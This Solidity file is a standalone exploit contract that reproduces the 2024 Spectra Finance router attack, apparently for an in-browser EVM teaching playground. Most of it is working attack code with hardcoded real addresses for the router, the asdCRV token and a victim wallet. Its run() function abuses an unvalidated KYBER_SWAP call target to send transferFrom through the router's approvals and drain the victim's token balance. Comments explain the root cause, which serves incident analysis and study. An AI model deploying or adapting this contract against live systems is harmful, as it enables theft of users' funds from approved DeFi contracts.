// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-07-Spectra_finance).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest` (attacker == address(this), no standalone exploit contract):
//
//   function attack() public {
//       bytes memory datas = abi.encode(
//           address(asdCRV), address(ETH_SENTINEL), 0, address(this), 1,
//           abi.encodeWithSelector(bytes4(0x23b872dd), victim, address(this), asdCRV.balanceOf(victim))
//       );
//       bytes[] memory data = new bytes[](1);
//       data[0] = datas;
//       address(VulnContract).call(abi.encodeWithSelector(bytes4(0x3593564c), hex"12", data, block.timestamp + 20));
//   }
//
// i.e. it calls the Spectra Router's `execute(bytes,bytes[],uint256)` with a
// single KYBER_SWAP (0x12) command whose decoded tuple points `kyberRouter` at
// the asdCRV token itself (NOT KyberSwap) with `targetData` = a raw
// `transferFrom(victim, attacker, victimBalance)`. Because tokenIn is the ETH
// sentinel, the Dispatcher's KYBER_SWAP handler skips all approval bookkeeping
// and does a bare `kyberRouter.call{value: msg.value}(targetData)` — the
// Router is a previously-approved spender for the victim's asdCRV, so the
// forwarded transferFrom succeeds and drains the victim's entire balance to
// the caller of run() (this contract).
//
// Reproduced here with a self-contained `syntheticExploit` (`SpectraDrain`) so
// the in-browser EVM can deploy it, call run(), and source-annotate the attack
// against the real fetched Router source (Dispatcher.sol / Router.sol).
//
// Root cause: Dispatcher.sol's KYBER_SWAP handler performs an UNVALIDATED
// external call (`kyberRouter.call(targetData)`) with fully caller-controlled
// target address and calldata, executed with the Router's own identity/
// approvals as msg.sender on the target.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IRouterExecute {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external payable;
}

contract SpectraDrain {
    // Router proxy (TransparentUpgradeableProxy) — the vulnerable entrypoint.
    address internal constant ROUTER = 0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a;
    // asdCRV (StakeDAO SdCrvCompounder), also used here as the KYBER_SWAP
    // "kyberRouter" call target — the exploit's whole point is that this field
    // is never validated to actually be KyberSwap.
    IERC20 internal constant ASDCRV = IERC20(0x43E54C2E7b3e294De3A155785F52AB49d87B9922);
    // Victim wallet with a live asdCRV approval to the Router.
    address internal constant VICTIM = 0x279a7DBFaE376427FFac52fcb0883147D42165FF;
    // Native-ETH sentinel used by Spectra's Constants.sol (Constants.ETH).
    address internal constant ETH_SENTINEL = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    /// @notice Recorded attack: craft the KYBER_SWAP command whose decoded
    ///         `kyberRouter` is the asdCRV token and whose `targetData` is a
    ///         raw transferFrom(victim, this, victimBalance), then call the
    ///         Router's execute(). The Router forwards the call as itself; it
    ///         is an approved spender for the victim's asdCRV, so the transfer
    ///         succeeds and the drained tokens land here.
    function run() external {
        uint256 victimBalance = ASDCRV.balanceOf(VICTIM);

        bytes memory targetData = abi.encodeWithSelector(
            bytes4(0x23b872dd), // transferFrom(address,address,uint256)
            VICTIM,
            address(this),
            victimBalance
        );

        // KYBER_SWAP tuple: (kyberRouter, tokenIn, amountIn, tokenOut, expectedAmountOut, targetData)
        bytes memory kyberSwapInput = abi.encode(
            address(ASDCRV), // kyberRouter — attacker-controlled, never validated
            ETH_SENTINEL, // tokenIn — ETH sentinel takes the no-approval raw-call branch
            uint256(0), // amountIn — matches msg.value == 0
            address(this), // tokenOut — must not be ETH_SENTINEL, else AddressError()
            uint256(1), // expectedAmountOut — decoded, never enforced
            targetData // the malicious transferFrom calldata
        );

        bytes memory commands = hex"12"; // Commands.KYBER_SWAP
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = kyberSwapInput;

        IRouterExecute(ROUTER).execute(commands, inputs, block.timestamp + 20);
    }
}
